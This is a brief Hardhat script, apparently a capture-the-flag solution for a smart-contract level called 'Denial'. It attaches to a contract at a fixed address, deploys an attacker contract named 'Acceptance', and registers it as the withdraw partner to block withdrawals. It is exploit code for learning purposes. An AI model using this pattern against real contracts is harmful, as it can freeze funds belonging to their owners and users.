// @ts-ignore
import { web3, ethers } from "hardhat";

async function main() {
    const Denial = await ethers.getContractFactory('Denial')
    const denial = await Denial.attach("0x154556F1dcfF70EC83aA09A8f1eA33624bc1861C")

    const balance = ethers.utils.formatEther(await denial.contractBalance())
    console.log("Contract Balance:", balance, "ETH")

    const attack = await ethers.getContractFactory('Acceptance')
    const acceptance = await attack.deploy()

    const tx = await denial.setWithdrawPartner(acceptance.address)
    await tx.wait()

    // const tx2 = await denial.withdraw()
    // await tx2.wait()
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
